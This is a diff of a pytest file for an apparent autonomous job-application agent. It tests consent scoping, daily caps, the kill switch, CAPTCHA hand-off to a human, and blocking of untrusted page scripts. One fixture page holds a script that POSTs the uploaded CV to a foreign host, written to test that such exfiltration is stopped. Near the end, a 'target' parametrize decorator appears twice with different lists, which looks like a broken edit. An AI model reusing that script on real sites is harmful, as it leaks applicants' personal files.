@@ -3,7 +3,7 @@
 from apply_cv_helpers import make_app, make_job
 import asyncio
 import json
-from contextlib import asynccontextmanager
+from contextlib import asynccontextmanager, closing
 from urllib.parse import urlsplit
 
 import pytest
@@ -33,9 +33,9 @@ def form(snapshot):
     ])
 
 
-def approved_fixture(profile, tmp_path, url, *, title="Ingénieur systèmes embarqués", company="Société Exemple"):
+def approved_fixture(profile, tmp_path, url, *, title="Ingénieur systèmes embarqués", company="Société Exemple", **kwargs):
     master = save_confirmed(profile.id)
-    job = make_job(profile, url=url, title=title, company=company)
+    job = make_job(profile, url=url, title=title, company=company, **kwargs)
     app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
     cvs.approve(app.id, app.current_rev)
     return job, app
@@ -56,6 +56,129 @@ def posting_form(action):
             '<label for="cv">CV</label><input id="cv" type="file" name="cv"><button>Envoyer</button></form>')
 
 
+async def test_production_autonomous_submits_with_receipt_and_scoped_decisions(production_pool, server, profile, tmp_path, fast, monkeypatch):
+    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
+    page_html = posting_form("/jobs/100").replace("<button>", """
+        <label><input name="privacy" type="checkbox" required>I accept the privacy policy</label>
+        <label><input name="marketing" type="checkbox">Subscribe to the marketing newsletter</label>
+        <label for="eeo">Disability self-identification</label>
+        <select id="eeo" name="eeo" required><option value="">Choose</option>
+        <option value="yes">Yes</option><option value="private">Prefer not to say</option></select><button>""")
+    server.html["/jobs/100"] = page_html
+    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
+
+    def plan(snapshot):
+        assert store.active_reservations(profile.id)
+        if snapshot.title == "Merci":
+            return StepPlan(page_kind="confirmation")
+        return form(snapshot)
+
+    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(plan))
+    assert result.status == "submitted", (result.message, server.posts)
+    assert result.result.consent_codes == ["application_privacy"]
+    assert len(server.posts) == 1
+    assert b"privacy=on" in server.posts[0]["body"] and b"eeo=private" in server.posts[0]["body"]
+    assert b"marketing=" not in server.posts[0]["body"]
+
+
+@pytest.mark.parametrize("restriction", ["cap", "breaker", "kill", "duplicate", "captcha"])
+async def test_production_autonomous_batch_gates(restriction, production_pool, server, profile, tmp_path, fast, monkeypatch):
+    monkeypatch.setattr(service.get_settings(), "apply_autonomous", restriction != "kill")
+    monkeypatch.setattr(service.get_settings(), "apply_daily_cap", 1 if restriction == "cap" else 40)
+    apps = []
+    for index, label in enumerate(("Plombier", "Horlogère", "Libraire"), 100):
+        path = f"/jobs/{index}"
+        server.html[path] = posting_form(path)
+        if restriction in {"breaker", "duplicate"}:
+            server.post_pages[path] = "bare_done.html"
+        kwargs = {"extra": {"origin_resolution": {"canonical_ok": True, "submit_ats": "lever", "tenant": "fixture", "requisition": "ABC"}}} if restriction == "duplicate" else {}
+        _, app = approved_fixture(profile, tmp_path, server.base + path, company=f"{label} SAS", title=label, **kwargs)
+        apps.append(app)
+    if restriction == "captcha":
+        server.redirects["/jobs/100"] = "/jobs/100/captcha"
+        server.html["/jobs/100/captcha"] = '<title>Vérification</title><div class="g-recaptcha" data-sitekey="fixture">Je ne suis pas un robot</div>'
+    runs = await service.send_selected([app.id for app in apps], pool=production_pool, planner=ScriptedPlanner(form))
+    expected = {
+        "cap": ["submitted", "blocked", "blocked"], "breaker": ["failed", "failed", "blocked"],
+        "kill": ["blocked"] * 3, "duplicate": ["failed", "blocked", "blocked"],
+        "captcha": ["needs_human", "submitted", "submitted"],
+    }[restriction]
+    assert [run.status for run in runs] == expected, [(run.status, run.message) for run in runs]
+    assert len(server.posts) == {"cap": 1, "breaker": 2, "kill": 0, "duplicate": 1, "captcha": 2}[restriction]
+    if restriction in {"breaker", "duplicate"}:
+        assert store.outstanding_attempt(apps[0].id).id == runs[0].id
+        retried = await service.run(apps[0].id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
+        assert retried.status == "blocked"
+        assert len(server.posts) == (2 if restriction == "breaker" else 1)
+    if restriction == "breaker":
+        assert store.host_paused("127.0.0.1") and "supervisé" in runs[2].message
+
+
+async def test_production_autonomous_blocks_foreign_write_after_upload(production_pool, server, profile, tmp_path, fast, monkeypatch):
+    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
+    with closing(FixtureServer()) as receiver:
+        server.html["/jobs/100"] = posting_form("/jobs/100") + f"""<script>
+        cv.onchange = async () => {{
+            await fetch('/upload', {{method: 'POST', body: cv.files[0]}});
+            await fetch('{receiver.base}/foreign', {{method: 'POST', body: cv.files[0]}});
+        }};
+        </script>"""
+        _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
+        result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
+        assert server.posts_to("/upload") and not receiver.posts and not server.posts_to("/jobs/100")
+        assert store.outstanding_attempt(app.id).id == result.id
+
+
+async def test_production_autonomous_refuses_page_script_submit_before_final_click(production_pool, server, profile, tmp_path, fast, monkeypatch):
+    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
+    server.html["/jobs/100"] = posting_form("/jobs/100") + """<script>
+        document.querySelector('#name').oninput = () => fetch('/jobs/100', {method: 'POST', body: 'synthetic'});
+    </script>"""
+    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
+    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
+    assert result.status == "needs_human" and not server.posts and not result.submit_clicked_at
+
+
+async def test_production_autonomous_allows_sibling_upload(production_pool, server, profile, tmp_path, fast, monkeypatch):
+    from patchright.async_api import Route
+
+    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
+    job_origin = "https://careers.example.com"
+    sibling = "https://uploads.example.com"
+    server.html["/jobs/100"] = posting_form("/jobs/100").replace(
+        "</form>", f"""</form><script>cv.onchange = () => fetch('{sibling}/upload',
+        {{method: 'POST', body: cv.files[0], mode: 'no-cors'}});</script>""")
+    original = Route.fetch
+    async def loopback_fetch(route, **kwargs):
+        requested = urlsplit(route.request.url)
+        assert origin(route.request.url) in {job_origin, sibling}
+        return await original(route, url=server.base + requested.path, **kwargs)
+
+    monkeypatch.setattr(Route, "fetch", loopback_fetch)
+    _, app = approved_fixture(profile, tmp_path, job_origin + "/jobs/100")
+    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
+    assert result.status == "submitted", result.message
+    assert server.posts_to("/upload")[0]["body"].startswith(b"%PDF-")
+
+
+def test_autonomous_public_suffixes_do_not_bridge_private_tenants():
+    from jobhunt.apply.autonomous import Audience
+
+    audience = Audience("https://jobs.first.appspot.com/jobs/100", (), lambda: None)
+    assert audience.write_recipient("https://upload.first.appspot.com/cv")
+    assert not audience.write_recipient("https://upload.second.appspot.com/cv")
+
+
+async def test_production_autonomous_wrong_posting_redirect_is_not_followed(production_pool, server, profile, tmp_path, fast, monkeypatch):
+    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
+    server.redirects["/jobs/100"] = "/jobs/200"
+    server.html["/jobs/200"] = posting_form("/jobs/200")
+    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
+    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
+    assert result.status == "needs_human" and "/jobs/200" not in server.requests and not server.posts
+
+
+@pytest.mark.parametrize("target", ["iframe", "action", "changed_action", "missing_id", "other_id", "other_origin", "other_base"])
 @pytest.mark.parametrize("target", ["iframe", "action", "changed_action", "missing_id", "other_id", "other_origin", "other_base",
                                     "query_other", "formaction"])
 async def test_production_generic_skips_unbound_targets(target, production_pool, server, profile, tmp_path, fast, monkeypatch):
